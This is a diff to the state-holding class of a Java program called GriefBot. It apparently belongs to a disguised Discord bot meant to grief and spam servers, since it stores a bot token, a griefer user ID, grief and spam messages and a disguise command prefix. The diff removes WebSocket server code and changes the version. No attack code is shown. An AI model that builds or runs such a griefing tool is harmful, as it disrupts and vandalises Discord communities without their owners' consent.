@@ -1,14 +1,8 @@
 package de.corruptedbytes;
 
-import java.net.InetSocketAddress;
-import java.util.ArrayList;
 import java.util.List;
 
-import org.java_websocket.WebSocket;
-
 import de.corruptedbytes.disguise.CommandManager;
-import de.corruptedbytes.webserver.WebServerSocket;
-import de.corruptedbytes.webserver.packets.PacketManager;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.sharding.ShardManager;
 
@@ -16,12 +10,9 @@ public class GriefBot {
 
 	private final static GriefBot INSTANCE = new GriefBot();
 	private final CommandManager commandManager = new CommandManager();
-	private final PacketManager packetManager = new PacketManager();
-	private final ArrayList<WebSocket> clients = new ArrayList<>();
-	private WebServerSocket webSocketServerListener;
 	ShardManager botManager;
 
-	private final String version = "v5.2.0";
+	private final String version = "v5.4.2";
 	
 	private String discordBotToken;
 	private String grieferUserID;
@@ -29,11 +20,9 @@ public class GriefBot {
 	private String griefMessage;
 	private String spamMessage;
 	private String disguiseCommandPrefix;
+	private int webServerPort;
 	private String griefPicture;
-	private String seed;
 	
-	private int webServerPort = 85;
-	private InetSocketAddress webServerSocket;
 
 	public static GriefBot getInstance() {
 		return INSTANCE;
@@ -41,14 +30,6 @@ public class GriefBot {
 
 	public CommandManager getCommandManager() {
 		return commandManager;
-	}
-	
-	public PacketManager getPacketManager() {
-		return packetManager;
-	}
-	
-	public ArrayList<WebSocket> getClients() {
-		return clients;
 	}
 
 	public ShardManager getBotManager() {
@@ -102,14 +83,6 @@ public class GriefBot {
 	public void setDisguiseCommandPrefix(String disguiseCommandPrefix) {
 		this.disguiseCommandPrefix = disguiseCommandPrefix;
 	}
-
-	public WebServerSocket getWebSocketServerListener() {
-		return webSocketServerListener;
-	}
-
-	public void setWebSocketServerListener(WebServerSocket webSocketServerListener) {
-		this.webSocketServerListener = webSocketServerListener;
-	}
 	
 	public List<Guild> getGuilds() {
 		return getInstance().getBotManager().getGuilds();
@@ -133,21 +106,5 @@ public class GriefBot {
 	
 	public int getWebServerPort() {
 		return webServerPort;
-	}
-	
-	public void setWebSocketServerPort(InetSocketAddress webServerSocket) {
-		this.webServerSocket = webServerSocket;
-	}
-	
-	public InetSocketAddress getWebSocketServer() {
-		return webServerSocket;
-	}
-	
-	public String getSeed() {
-		return seed;
-	}
-	
-	public void setSeed(String seed) {
-		this.seed = seed;
 	}
 }
